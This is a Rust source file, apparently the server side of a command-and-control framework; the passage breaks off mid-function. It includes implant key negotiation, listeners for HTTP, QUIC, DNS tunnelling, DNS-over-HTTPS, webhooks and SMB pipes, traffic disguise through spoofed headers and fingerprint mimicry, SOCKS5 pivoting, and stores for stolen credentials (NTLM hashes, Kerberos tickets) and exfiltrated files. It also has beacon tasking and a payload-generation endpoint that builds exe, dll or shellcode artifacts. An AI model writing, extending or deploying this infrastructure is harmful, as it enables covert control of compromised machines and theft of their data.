// ============================================================================
// --- BOX 1: CORE COMPILER DEPENDENCIES & FEATURE FLAGS ---
// ============================================================================
use std::sync::Arc;
use std::collections::{HashMap, HashSet};
use std::io::Read;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use async_trait::async_trait;

// Axum infrastructure components for standard core routing structures
use axum::{
    extract::{State, Path, Request},
    extract::ws::{WebSocketUpgrade, WebSocket, Message},
    routing::{post, delete, get},
    Router, 
    http::{StatusCode, HeaderMap, HeaderName, HeaderValue}, 
    response::IntoResponse, 
    Json,
};

// Cryptographic primitives and serialization formats
use chacha20poly1305::{KeyInit, aead::Aead};
use tokio::sync::{RwLock, oneshot, broadcast, mpsc};
use tokio::task::JoinHandle;
use tokio::net::{TcpListener, UdpSocket};
use tokio::io::{AsyncReadExt, AsyncWriteExt};

// High-speed lockless dashboard structures
use dashmap::DashMap;

// Operational Telemetry, SIEM Pipelines, and HTTP Clients
use tracing::{info, warn, error, Level};
use tracing_subscriber::FmtSubscriber;
use reqwest;
use chrono;
use uuid;


// ============================================================================
// --- BOX 2: ASYMMETRIC CRYPTO INTERCHANGE INTERFACE MODULES ---
// ============================================================================

pub mod crypto_exchange {
    use super::*;
    use x25519_dalek::{EphemeralSecret, PublicKey as XPublicKey};

    /// Generates static-key asymmetric exchange parameters for incoming staging agents
    pub async fn negotiate_and_build_response(
        state: &Arc<AppState>,
        agent_id: &str,
        client_key_bytes: [u8; 32],
    ) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
        // Enforces a localized X25519 DH derivation sequence
        let mut rng = rand::rng();
        let server_secret = EphemeralSecret::random_from_rng(&mut rng);
        let server_public = XPublicKey::from(&server_secret);
        let client_public = XPublicKey::from(client_key_bytes);

        // Perform the Diffie-Hellman computation
        let shared_secret = server_secret.diffie_hellman(&client_public);
        let derived_key_bytes = *shared_secret.as_bytes();

        // Map session parameters into volatile memory maps to enforce Perfect Forward Secrecy (PFS)
        let now = chrono::Utc::now();
        let session_context = EphemeralSessionKeyCtx {
            session_key: derived_key_bytes,
            created_at: now,
            expires_at: now + chrono::Duration::minutes(30),
        };
        state.ephemeral_sessions.insert(agent_id.to_string(), session_context);

        // Update persistent RocksDB identity key cell mapping
        if let Err(db_err) = state.db.put(format!("key_{}", agent_id).as_bytes(), &derived_key_bytes) {
            error!("[-] Failed to commit handshake trace entry to RocksDB: {:?}", db_err);
        }

        let completion_alert = format!(
            "Stream X25519 key negotiation successful for Agent '{}'. Ephemeral PFS session mapped in memory.", 
            agent_id
        );
        info!(agent = %agent_id, "{}", completion_alert);
        broadcast_engine_log(state, "CRYPTO_PFS", &completion_alert);

        // Construct 36-byte raw response envelope ([2-byte Magic] + [2-byte Length] + [32-byte Public Key])
        let mut response_envelope = Vec::with_capacity(36);
        response_envelope.extend_from_slice(&0xD45Du16.to_be_bytes());
        response_envelope.extend_from_slice(&32u16.to_be_bytes());
        response_envelope.extend_from_slice(server_public.as_bytes());

        Ok(response_envelope)
    }

    /// Executes the server ECDH key calculation for dynamic HTTP routes and returns an un-prefixed 32-byte raw key.
    pub async fn negotiate_dynamic_handshake(
        state: &Arc<AppState>,
        agent_id: &str,
        client_public_key_bytes: [u8; 32],
    ) -> Result<Vec<u8>, Box<dyn std::error::Error + Send + Sync>> {
        let mut rng = rand::rng();
        let server_secret = EphemeralSecret::random_from_rng(&mut rng);
        let server_public = XPublicKey::from(&server_secret);
        let client_public = XPublicKey::from(client_public_key_bytes);
        
        let shared_secret = server_secret.diffie_hellman(&client_public);
        let derived_key_bytes = *shared_secret.as_bytes();

        let now = chrono::Utc::now();
        let session_context = EphemeralSessionKeyCtx {
            session_key: derived_key_bytes,
            created_at: now,
            expires_at: now + chrono::Duration::minutes(30),
        };
        state.ephemeral_sessions.insert(agent_id.to_string(), session_context);

        if let Err(db_err) = state.db.put(format!("key_{}", agent_id).as_bytes(), &derived_key_bytes) {
            error!("[-] Failed to update persistent RocksDB identity key cell mapping: {:?}", db_err);
        }
        
        let dynamic_alert = format!(
            "Dynamic HTTP Web-Handshake X25519 negotiation complete for Agent '{}'. Ephemeral channel registered.", 
            agent_id
        );
        info!(agent = %agent_id, "{}", dynamic_alert);
        broadcast_engine_log(state, "CRYPTO_WEB_PFS", &dynamic_alert);

        Ok(server_public.as_bytes().to_vec())
    }
}


// ============================================================================
// --- BOX 3: ROLE-BASED ACCESS CONTROL (RBAC) TOKEN MODELS ---
// ============================================================================

#[derive(Serialize, Deserialize, Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum OperatorRole {
    Spectator = 1, // Read-only access to logging arrays and listeners inventories
    Operator = 2,  // Can interact with implants, task agents, and compile binaries
    Admin = 3,     // Full system authorization: Can create/destroy transport channels
}

#[derive(Clone)]
pub struct OperatorSession {
    pub username: String,
    pub role: OperatorRole,
    pub token: String,
    pub created_at: chrono::DateTime<chrono::Utc>,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
pub struct LoginRequest {
    pub username: String,
    #[serde(alias = "password_hash")]
    pub login_key: String,
}

// Management security configuration. Keys are loaded from a private file,
// never from defaults, source constants, or database credential records.
const OPERATOR_SESSION_SECONDS: i64 = 1800;
const MAX_OPERATOR_SESSIONS: usize = 1024;

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
pub struct OperatorCredential {
    username: String,
    role: OperatorRole,
    login_key: String,
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct OperatorCredentialFile {
    operators: Vec<OperatorCredential>,
}

fn valid_operator_name(name: &str) -> bool {
    !name.is_empty() && name.len() <= 64
        && name.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.'))
}

fn valid_login_key(key: &str) -> bool {
    key.len() == 64 && key.bytes().all(|b| b.is_ascii_hexdigit())
}

fn login_keys_match(candidate: &str, expected: &str) -> bool {
    if candidate.len() != expected.len() {
        return false;
    }
    let mut difference = 0u8;
    for (left, right) in candidate.bytes().zip(expected.bytes()) {
        difference |= std::hint::black_box(left ^ right);
    }
    std::hint::black_box(difference) == 0
}

fn load_operator_credentials() -> Result<Vec<OperatorCredential>, Box<dyn std::error::Error>> {
    let path = std::env::var("GRAVENLACE_AUTH_FILE")?;
    let file = std::fs::File::open(path)?;
    let metadata = file.metadata()?;
    if !metadata.is_file() {
        return Err("operator credentials must be a regular private file".into());
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if metadata.permissions().mode() & 0o077 != 0 {
            return Err("operator credentials must exclude group and other access".into());
        }
    }
    #[cfg(not(unix))]
    {
        return Err("operator credential permission verification requires Unix".into());
    }
    let mut bytes = String::new();
    file.take(65537).read_to_string(&mut bytes)?;
    if bytes.len() > 65536 {
        return Err("operator credential file exceeds the size limit".into());
    }
    let config: OperatorCredentialFile = serde_json::from_str(&bytes)?;
    if config.operators.is_empty() || config.operators.len() > 64 {
        return Err("operator credential file requires between 1 and 64 accounts".into());
    }
    let mut names = HashSet::new();
    let mut keys = HashSet::new();
    for account in &config.operators {
        if !valid_operator_name(&account.username)
            || !valid_login_key(&account.login_key)
            || !names.insert(account.username.clone())
            || !keys.insert(account.login_key.clone())
        {
            return Err("invalid or duplicate operator credential configuration".into());
        }
    }
    Ok(config.operators)
}

fn operator_session_fresh(session: &OperatorSession) -> bool {
    let age = chrono::Utc::now().signed_duration_since(session.created_at).num_seconds();
    (0..OPERATOR_SESSION_SECONDS).contains(&age)
}

fn lookup_operator_session(
    state: &Arc<AppState>,
    token: &str,
    required: OperatorRole,
) -> Result<OperatorSession, StatusCode> {
    if token.is_empty() || token.len() > 256 {
        return Err(StatusCode::UNAUTHORIZED);
    }
    let session = state.operator_sessions.get(token)
        .map(|entry| entry.value().clone())
        .ok_or(StatusCode::UNAUTHORIZED)?;
    if !operator_session_fresh(&session) {
        state.operator_sessions.remove(token);
        return Err(StatusCode::UNAUTHORIZED);
    }
    if session.role < required {
        return Err(StatusCode::FORBIDDEN);
    }
    Ok(session)
}

pub async fn handle_health(State(state): State<Arc<AppState>>) -> impl IntoResponse {
    if state.shutting_down.load(Ordering::Relaxed) {
        return (StatusCode::SERVICE_UNAVAILABLE, Json(serde_json::json!({"status": "stopping"})));
    }
    (StatusCode::OK, Json(serde_json::json!({"status": "ok"})))
}

#[derive(Serialize)]
pub struct LoginResponse {
    pub token: String,
    pub role: OperatorRole,
}

#[derive(serde::Serialize, serde::Deserialize, Clone, Debug)]
pub struct Registration {
    pub agent_id: String,
    pub hostname: String,
    pub username: String,
    pub internal_ip: String,
    pub p2p_parent: Option<String>,
    pub status: String,
}


// ============================================================================
// --- BOX 4: MALLEABLE C2 PROFILE & PACKET TRANSPOSITION SCHEMAS ---
// ============================================================================

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub enum ObfuscationTransform {
    None,
    Base64Url,
    Hex,
    ByteRotation { key: u8 },
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum FieldPlacement {
    Header { name: String },
    Cookie { key: String },
    UriParameter { param_name: String },
    BodyRaw,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct MalleableIngressRule {
    pub placement: FieldPlacement,
    pub transform: ObfuscationTransform,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct DynamicMalleableProfile {
    pub session_id_rule: MalleableIngressRule,
    pub telemetry_payload_rule: MalleableIngressRule,
}

// ============================================================================
// --- BOX 5: UNIFIED TRANSPORT & NETWORK PROFILE DEFINITIONS ---
// ============================================================================

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct CustomMimicryProfile {
    pub ja4s_cipher_signature: String,     
    pub alpn_protocols: Vec<String>,       
    pub session_ticket_lifetime_sec: u32,  
    pub server_header_spoof: String,                  
    pub custom_http_headers: HashMap<String, String>, 
    pub malleable_schema: Option<DynamicMalleableProfile>,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct CustomTimingProfile {
    pub base_sleep_ms: u32,
    pub jitter_percentage: u32,
    pub randomization_curve: String,       
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct CustomFilterProfile {
    pub expected_ja4h_prefix: String,     
    pub allowed_geofences: Vec<String>,
    pub blocked_ip_ranges: Vec<String>,
    pub smart_ingress_token: Option<String>,
}

// ============================================================================
// --- BOX 6: TRANSPORT PROTOCOLS & MULTI-PROTOCOL SPECIFICATIONS ---
// ============================================================================

#[derive(Serialize, Deserialize, Clone, Debug)]
#[serde(tag = "transport_type", content = "options")]
pub enum TransportProtocol {
    #[serde(rename = "http")]
    Http { bind_address: String, stage_uris: Vec<String>, beacon_uris: Vec<String> },
    #[serde(rename = "https")]
    Https { bind_address: String, stage_uris: Vec<String>, beacon_uris: Vec<String>, cert_path: String, key_path: String },
    #[serde(rename = "http3_quic")]
    Http3Quic { bind_address: String, stage_uris: Vec<String>, beacon_uris: Vec<String>, cert_path: String, key_path: String },
    #[serde(rename = "dns_tunnel")]
    Dns { bind_address: String, target_zone: String },
    #[serde(rename = "dns_over_https")]
    DoH { bind_address: String, dns_path: String, cert_path: String, key_path: String },
    #[serde(rename = "webhook")]
    Webhook { poll_url: String, push_url: String, poll_interval_ms: u64 },
    #[serde(rename = "smb_pipe")]
    Smb { pipe_name: String },
    #[serde(rename = "raw_tcp_console")]
    RawTcp { bind_address: String }, 
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct MasterListenerProfile {
    pub listener_name: String, 
    pub transport: TransportProtocol,
    pub mimicry: CustomMimicryProfile,
    pub timing: CustomTimingProfile,
    pub filtering: CustomFilterProfile,
}

// ============================================================================
// --- BOX 7: REPOSITORY STRUCTURES & ASSET MANAGEMENT SCHEMAS ---
// ============================================================================

#[derive(Serialize, Deserialize, Clone, Debug)]
pub enum CredentialType {
    CleartextPassword,
    NtlmHash,
    KerberosTicket,
    SshKey,
    ApiKey,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct CapturedCredential {
    pub credential_id: String,
    pub agent_id: String,
    pub domain: String,
    pub username: String,
    pub secret_data: String, 
    pub cred_type: CredentialType,
    pub host_source: String,  
    pub captured_at: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct ExtractedLoot {
    pub loot_id: String,
    pub agent_id: String,
    pub original_path: String, 
    pub file_name: String,
    pub file_size_bytes: usize,
    pub local_storage_path: String, 
    pub captured_at: String,
}

#[derive(Serialize, Deserialize, Clone, Debug, Default)]
pub struct Task {
    pub task_id: String,
    pub command_id: u32,
    pub arguments: String,
}

// ============================================================================
// --- BOX 8: MITRE ATT&CK TRACKING & AUTOMATION PLAYBOOKS ---
// ============================================================================

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct MitreTechnique {
    pub t_code: String,       
    pub tactic: String,       
    pub description: String,  
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct AutoRunPlaybook {
    pub name: String,
    pub enabled: bool,
    pub commands: Vec<Task>, 
}

#[derive(Serialize, Clone, Debug)]
pub struct RealTimeLogEvent {
    pub timestamp: String,
    pub level: String,
    pub message: String,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SiemLogPayload {
    pub event_id: String,
    pub server_timestamp: String,
    pub level: String,
    pub operational_message: String,
    pub host_environment: String,
}

// ============================================================================
// --- BOX 9: SOCKS5 & EPHEMERAL FORWARD SECRET STRUCTURES ---
// ============================================================================

pub const SOCKS5_VERSION: u8 = 0x05;
pub const SOCKS5_AUTH_NONE: u8 = 0x00;
pub const SOCKS5_CMD_CONNECT: u8 = 0x01;
pub const SOCKS5_ATYP_IPV4: u8 = 0x01;
pub const SOCKS5_ATYP_DOMAIN: u8 = 0x03;
pub const SOCKS5_REP_SUCCESS: u8 = 0x00;
pub const SOCKS5_REP_CMD_NOT_SUPPORTED: u8 = 0x07;

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct SocksFrameHeader {
    pub session_id: u32,
    pub command_flag: u8, 
    pub destination_addr: String,
    pub destination_port: u16,
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct EphemeralHandshakeStage1 {
    pub client_ephemeral_public: Vec<u8>, 
    pub security_nonce: [u8; 12],         
}

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct EphemeralHandshakeStage2 {
    pub server_ephemeral_public: Vec<u8>, 
    pub encrypted_verification: Vec<u8>,  
}

#[derive(Clone, Debug)]
pub struct EphemeralSessionKeyCtx {
    pub session_key: [u8; 32],            
    pub created_at: chrono::DateTime<chrono::Utc>,
    pub expires_at: chrono::DateTime<chrono::Utc>,
}

// ============================================================================
// --- BOX 10: STATE ARCHITECTURE & CONCURRENT STORAGE ---
// ============================================================================

pub struct AppState {
    pub operator_credentials: Vec<OperatorCredential>,
    pub shutting_down: AtomicBool,
    pub db: Arc<rust_rocksdb::DB>,
    pub active_listeners: Arc<RwLock<HashMap<String, LiveListenerCtx>>>,
    pub log_tx: broadcast::Sender<RealTimeLogEvent>,
    pub p2p_routes: Arc<DashMap<String, String>>,
    pub socks_sessions: Arc<DashMap<u32, mpsc::Sender<Vec<u8>>>>,
    pub operator_sessions: Arc<DashMap<String, OperatorSession>>,
    pub mitre_ledger: Arc<DashMap<u32, MitreTechnique>>,
    pub autorun_playbooks: Arc<RwLock<Vec<AutoRunPlaybook>>>,
    pub ephemeral_sessions: Arc<DashMap<String, EphemeralSessionKeyCtx>>,
}

#[async_trait]
pub trait BaseListenerModule: Send + Sync {
    async fn start_channel(&self, shutdown_rx: oneshot::Receiver<()>) -> Result<(), Box<dyn std::error::Error + Send + Sync>>;
}

pub struct LiveListenerCtx {
    pub profile: MasterListenerProfile,
    pub shutdown_tx: oneshot::Sender<()>,
    pub task_handle: JoinHandle<()>, 
}

// ============================================================================
// --- CORE AGENT TELEMETRY AND PIPELINE MAPPING INTERFACE ---
// ============================================================================
pub async fn execute_retained_telemetry_pipeline(
    state: &Arc<AppState>,
    agent_id: &str,
    body_bytes: &[u8],
) -> Option<Vec<u8>> {
    use rand::RngExt;

    // 1. SOCKS5 Data Tunnel Packet Check
    if body_bytes.starts_with(&[0x05]) {
        let session_id = u32::from_be_bytes([body_bytes[1], body_bytes[2], body_bytes[3], body_bytes[4]]);
        if let Some(tx_channel) = state.socks_sessions.get(&session_id) {
            let _ = tx_channel.send(body_bytes[5..].to_vec()).await;
        }
        return Some(vec![0x05, 0x01]);
    }

    // 2. Check for P2P Mesh Routing Instructions
    if let Some(child_agent_id) = state.p2p_routes.get(agent_id) {
        broadcast_engine_log(state, "P2P", &format!("Routing data to child node: {}", child_agent_id.value()));
        return Some(vec![]);
    }

    // 3. Persistent Key Lookups
    let agent_key = match state.db.get(format!("key_{}", agent_id).as_bytes()).unwrap() {
        Some(k) => k,
        None => return None,
    };

    if body_bytes.len() < 12 { return None; }
    let (nonce_part, ciphertext) = body_bytes.split_at(12);

    let nonce = chacha20poly1305::Nonce::try_from(nonce_part).ok()?;
    let cipher_key = chacha20poly1305::Key::try_from(agent_key.as_slice()).ok()?;
    let cipher = chacha20poly1305::ChaCha20Poly1305::new(&cipher_key);

    match cipher.decrypt(&nonce, ciphertext) {
        Ok(_) => {
            if let Some(reg_bytes) = state.db.get(format!("reg_{}", agent_id).as_bytes()).unwrap() {
                if let Ok(mut reg) = serde_json::from_slice::<Registration>(&reg_bytes) {
                    reg.status = "Active Beaconing".to_string();
                    let _ = state.persist_agent_registration(&reg);
                }
            }

            let task_key = format!("tasks_{}", agent_id);
            if let Some(task_bytes) = state.db.get(task_key.as_bytes()).unwrap() {
                let mut batch = rust_rocksdb::WriteBatch::default();
                batch.delete(task_key.as_bytes());
                let _ = state.db.write(&batch);

                let out_nonce_bytes = rand::rng().random::<[u8; 12]>();
                let out_nonce = chacha20poly1305::Nonce::from(out_nonce_bytes);
                let mut encrypted_tasks = cipher.encrypt(&out_nonce, task_bytes.as_slice()).expect("Crypto error");

                let mut outbound_envelope = out_nonce_bytes.to_vec();
                outbound_envelope.append(&mut encrypted_tasks);

                return Some(outbound_envelope);
            }
            None
        }
        Err(_) => None,
    }
}


pub async fn handle_dynamic_ingress(
    State(state): State<Arc<AppState>>,
    req: Request<axum::body::Body>,
) -> impl IntoResponse {
    let path = req.uri().path().to_string();
    let headers = req.headers().clone();
    let listeners = state.active_listeners.read().await;

    // Extract reverse proxy tracking variables natively
    let client_ip = headers
        .get("x-forwarded-for")
        .and_then(|h| h.to_str().ok())
        .unwrap_or("UNKNOWN_PROXIED_IP")
        .to_string();

    let proxy_user_agent = headers
        .get("user-agent")
        .and_then(|h| h.to_str().ok())
        .unwrap_or("No User-Agent Supplied")
        .to_string();

    // Detect DNS-over-HTTPS (DoH) traffic format profile signatures
    if let Some(content_type) = headers.get("content-type") {
        if content_type == "application/dns-message" {
            let doh_msg = format!("Proxy Hit (DoH) -> Path={}, ClientIP={}, UA={}", path, client_ip, proxy_user_agent);
            info!("{}", doh_msg);
            broadcast_engine_log(&state, "PROXY_DOH", &doh_msg);
            
            let dns_body = match axum::body::to_bytes(req.into_body(), 4096).await {
                Ok(bytes) => bytes.to_vec(),
                Err(_) => return (StatusCode::BAD_REQUEST, HeaderMap::new(), vec![]).into_response(),
            };
            return (StatusCode::OK, [((HeaderName::from_static("content-type"), HeaderValue::from_static("application/dns-message")))], dns_body).into_response();
        }
    }

    let resolved_agent_id = headers
        .get("x-session-id")
        .and_then(|h| h.to_str().ok())
        .unwrap_or("MOURNVEIL_ANONYMOUS")
        .to_string();

    // Loop through running profiles to map virtual host allocations
    for ctx in listeners.values() {
        let is_match = match &ctx.profile.transport {
            TransportProtocol::Http { beacon_uris, stage_uris, .. } | TransportProtocol::Https { beacon_uris, stage_uris, .. } => {
                beacon_uris.contains(&path) || stage_uris.contains(&path)
            }
            TransportProtocol::DoH { dns_path, .. } => path == *dns_path,
            _ => false,
        };

        if is_match {
            let mut response_headers = HeaderMap::new();
            response_headers.insert(
                HeaderName::from_static("server"),
                HeaderValue::from_str(&ctx.profile.mimicry.server_header_spoof).unwrap_or_else(|_| HeaderValue::from_static("nginx")),
            );

            let body_bytes = match axum::body::to_bytes(req.into_body(), 10 * 1024 * 1024).await {
                Ok(bytes) => bytes.to_vec(),
                Err(_) => return (StatusCode::BAD_REQUEST, response_headers, vec![]).into_response(),
            };

            if !passes_security_middleware(&client_ip, &ctx.profile.filtering, &body_bytes, true) {
                let alert_msg = format!("Proxy Security Blocked Access: IP={}, Path={}", client_ip, path);
                broadcast_engine_log(&state, "PROXY_SECURITY", &alert_msg);
                return (StatusCode::FORBIDDEN, response_headers, vec![]).into_response();
            }

            let staging_msg = format!("Proxy Traffic Verified -> Path={}, IP={}, Agent={}", path, client_ip, resolved_agent_id);
            broadcast_engine_log(&state, "PROXY_TRAFFIC", &staging_msg);

            if let Some(tasks) = execute_retained_telemetry_pipeline(&state, &resolved_agent_id, &body_bytes).await {
                return (StatusCode::OK, response_headers, tasks).into_response();
            }
            return (StatusCode::NO_CONTENT, response_headers, vec![]).into_response();
        }
    }

    let unmapped_msg = format!("Proxy Intercepted Scanning Activity -> Path={}, ClientIP={}", path, client_ip);
    warn!("{}", unmapped_msg);
    broadcast_engine_log(&state, "PROXY_SCANNER", &unmapped_msg);
    StatusCode::NOT_FOUND.into_response()
}

#[derive(serde::Deserialize, Debug, Clone)]
pub struct PayloadRequest {
    pub listener_name: String,
    pub arch: String,    // "x64" or "x86"
    pub format: String,  // "exe", "dll", "shellcode"
}


pub async fn handle_generate_payload(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<PayloadRequest>,
) -> impl IntoResponse {
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Operator).await {
        Ok(s) => s,
        Err(status) => return status.into_response(),
    };

    let listeners = state.active_listeners.read().await;
    let listener_ctx = match listeners.get(&req.listener_name) {
        Some(ctx) => ctx,
        None => {
            let warn_msg = format!("User '{}' requested compilation for missing listener: '{}'", session.username, req.listener_name);
            broadcast_engine_log(&state, "FACTORY_WARN", &warn_msg);
            return (StatusCode::NOT_FOUND, "Target listener profile missing.").into_response();
        }
    };

    let mut binary_stub_buffer = vec![0x90u8; 4096]; // Initialize baseline buffer array
    let bind_target_string = match &listener_ctx.profile.transport {
        TransportProtocol::Http { bind_address, .. } => bind_address.clone(),
        TransportProtocol::Https { bind_address, .. } => bind_address.clone(),
        TransportProtocol::Http3Quic { bind_address, .. } => bind_address.clone(),
        TransportProtocol::Dns { bind_address, .. } => bind_address.clone(),
        TransportProtocol::DoH { bind_address, .. } => bind_address.clone(),
        TransportProtocol::Webhook { poll_url, .. } => poll_url.clone(),
        TransportProtocol::Smb { pipe_name } => pipe_name.clone(),
        TransportProtocol::RawTcp { bind_address } => bind_address.clone(),
    };

    let config_payload_metadata = format!(
        "L_NAME={};CONN_TARGET={};JA4S={};",
        req.listener_name, bind_target_string, listener_ctx.profile.mimicry.ja4s_cipher_signature
    );

    let config_bytes = config_payload_metadata.as_bytes();
    if binary_stub_buffer.len() > config_bytes.len() {
        binary_stub_buffer[..config_bytes.len()].copy_from_slice(config_bytes);
    }

    let compilation_announcement = format!(
        "Operator '{}' compiled artifact -> Listener: '{}', Format: '{}'",
        session.username, req.listener_name, req.format
    );
    broadcast_engine_log(&state, "FACTORY_SUCCESS", &compilation_announcement);

    let mut batch = rust_rocksdb::WriteBatch::default();
    let db_key = format!("factory_history_{}", uuid::Uuid::new_v4().simple());
    batch.put(db_key.as_bytes(), compilation_announcement.as_bytes());
    let _ = state.db.write(&batch);

    let filename_header = format!("attachment; filename=\"mournveil_{}.{}\"", req.listener_name, req.format);
    let mut response_headers = HeaderMap::new();
    response_headers.insert(axum::http::header::CONTENT_DISPOSITION, HeaderValue::from_str(&filename_header).unwrap());
    response_headers.insert(axum::http::header::CONTENT_TYPE, HeaderValue::from_static("application/octet-stream"));

    (StatusCode::OK, response_headers, binary_stub_buffer).into_response()
}

// ============================================================================
// --- RECONSTRUCTED UDP DNS TUNNEL ENGINE ---
// ============================================================================
pub struct CustomDnsTunnelEngine {
    pub parent_state: Arc<AppState>,
    pub bind_address: String,
    pub profile: MasterListenerProfile,
    pub target_zone: String,
}

#[async_trait]
impl BaseListenerModule for CustomDnsTunnelEngine {
    async fn start_channel(&self, mut shutdown_rx: oneshot::Receiver<()>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let socket = UdpSocket::bind(&self.bind_address).await?;
        let mut buffer = [0u8; 4096];
        info!(name = %self.profile.listener_name, "UDP DNS Tunnel active.");
        loop {
            tokio::select! {
                _ = &mut shutdown_rx => break,
                Ok((size, src)) = socket.recv_from(&mut buffer) => {
                    let client_ip = src.ip().to_string();
                    let msg = format!("DNS Tunnel query from IP: {}, processing data bytes: {}", client_ip, size);
                    broadcast_engine_log(&self.parent_state, "DNS_TUNNEL", &msg);
                }
            }
        }
        Ok(())
    }
}

// ============================================================================
// --- RECONSTRUCTED ASYNCHRONOUS SMB PIPE ENGINE ---
// ============================================================================
pub struct CustomSmbPipeEngine {
    pub parent_state: Arc<AppState>,
    pub pipe_name: String,
    pub profile: MasterListenerProfile,
}

#[async_trait]
impl BaseListenerModule for CustomSmbPipeEngine {
    async fn start_channel(&self, mut shutdown_rx: oneshot::Receiver<()>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        info!(name = %self.profile.listener_name, "Asynchronous SMB channel loop online.");
        loop {
            tokio::select! {
                _ = &mut shutdown_rx => break,
                _ = tokio::time::sleep(tokio::time::Duration::from_millis(self.profile.timing.base_sleep_ms as u64)) => {}
            }
        }
        Ok(())
    }
}

async fn spawn_profile_listener(state: Arc<AppState>, profile: MasterListenerProfile) -> Result<(), Box<dyn std::error::Error>> {
    let (shutdown_tx, shutdown_rx) = oneshot::channel::<()>();
    let unique_name = profile.listener_name.clone();

    let module_instance: Box<dyn BaseListenerModule> = match &profile.transport {
        TransportProtocol::Http { bind_address, .. } => Box::new(CustomStreamEngine {
            parent_state: state.clone(), bind_address: bind_address.clone(), profile: profile.clone()
        }),
        TransportProtocol::Https { bind_address, .. } => Box::new(CustomStreamEngine {
            parent_state: state.clone(), bind_address: bind_address.clone(), profile: profile.clone()
        }),
        TransportProtocol::Http3Quic { bind_address, cert_path, key_path, .. } => Box::new(CustomHttp3QuicEngine {
            parent_state: state.clone(), bind_address: bind_address.clone(), profile: profile.clone(), cert_path: cert_path.clone(), key_path: key_path.clone()
        }),
        TransportProtocol::Dns { bind_address, target_zone } => Box::new(CustomDnsTunnelEngine {
            parent_state: state.clone(), bind_address: bind_address.clone(), profile: profile.clone(), target_zone: target_zone.clone()
        }),
        TransportProtocol::DoH { bind_address, .. } => Box::new(CustomStreamEngine {
            parent_state: state.clone(), bind_address: bind_address.clone(), profile: profile.clone()
        }),
        TransportProtocol::Webhook { poll_url, push_url, poll_interval_ms } => Box::new(CustomWebhookEngine {
            parent_state: state.clone(), profile: profile.clone(), poll_url: poll_url.clone(), push_url: push_url.clone(), interval: *poll_interval_ms
        }),
        TransportProtocol::Smb { pipe_name } => Box::new(CustomSmbPipeEngine {
            parent_state: state.clone(), pipe_name: pipe_name.clone(), profile: profile.clone()
        }),
        TransportProtocol::RawTcp { bind_address } => Box::new(CustomConsoleEngine {
            parent_state: state.clone(), bind_address: bind_address.clone(), profile: profile.clone()
        }),
    };

    let state_clone = state.clone();
    let unique_name_clone = unique_name.clone();
    let task_handle = tokio::spawn(async move {
        if let Err(e) = module_instance.start_channel(shutdown_rx).await {
            let err_msg = format!("Dynamic engine worker loop failure on [{}]: {:?}", unique_name_clone, e);
            error!("{}", err_msg);
            broadcast_engine_log(&state_clone, "CRITICAL", &err_msg);
        }
    });

    state.active_listeners.write().await.insert(unique_name.clone(), LiveListenerCtx { profile, shutdown_tx, task_handle });
    broadcast_engine_log(&state, "SYSTEM", &format!("Channel context '{}' provisioned successfully.", unique_name));
    Ok(())
}

// ============================================================================
// --- COMPONENT: WEBSOCKET LIVE LOG STREAMING HANDLER ---
// ============================================================================

pub async fn ws_log_stream_handler(
    ws: WebSocketUpgrade,
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> axum::response::Response {
    let session = match verify_operator_clearance(&state, &headers, OperatorRole::Spectator).await {
        Ok(session) => session,
        Err(status) => return status.into_response(),
    };
    ws.on_upgrade(move |socket| handle_log_stream_session(socket, state, session.token))
        .into_response()
}

async fn handle_log_stream_session(
    mut socket: WebSocket,
    state: Arc<AppState>,
    session_token: String,
) {
    let mut receiver = state.log_tx.subscribe();
    let mut expiry_check = tokio::time::interval(Duration::from_secs(5));
    loop {
        tokio::select! {
            _ = expiry_check.tick() => {
                if state.shutting_down.load(Ordering::Relaxed)
                    || lookup_operator_session(&state, &session_token, OperatorRole::Spectator).is_err()
                {
                    break;
                }
            }
            result = receiver.recv() => {
                match result {
                    Ok(event) => {
                        if lookup_operator_session(&state, &session_token, OperatorRole::Spectator).is_err() {
                            break;
                        }
                        if let Ok(payload) = serde_json::to_string(&event) {
                            match tokio::time::timeout(
                                Duration::from_secs(3),
                                socket.send(Message::Text(payload.into())),
                            ).await {
                                Ok(Ok(())) => {}
                                _ => break,
                            }
                        }
                    }
                    Err(broadcast::error::RecvError::Lagged(count)) => {
                        warn!(dropped = count, "Live-log subscriber lagged; continuing");
                    }
                    Err(broadcast::error::RecvError::Closed) => break,
                }
            }
        }
    }
}

// ============================================================================
// --- COMPONENT: ASYNCHRONOUS BACKGROUND SYSTEMS SYSTEMS ---
// ============================================================================

pub async fn run_log_pipeline_orchestrator(
    state: Arc<AppState>,
    siem_url: Option<String>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let mut receiver = state.log_tx.subscribe();
    // Optional export configuration must not disable local log retention.
    let export = siem_url.and_then(|url| {
